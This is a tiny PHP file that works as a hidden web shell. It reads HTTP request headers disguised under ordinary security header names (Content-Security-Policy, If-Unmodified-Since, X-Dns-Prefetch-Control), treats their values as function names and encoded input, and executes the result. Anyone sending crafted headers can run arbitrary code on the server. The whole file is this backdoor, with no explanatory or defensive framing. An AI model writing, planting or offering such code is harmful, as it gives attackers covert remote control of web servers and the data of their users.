<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $accepted = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $accepted();
}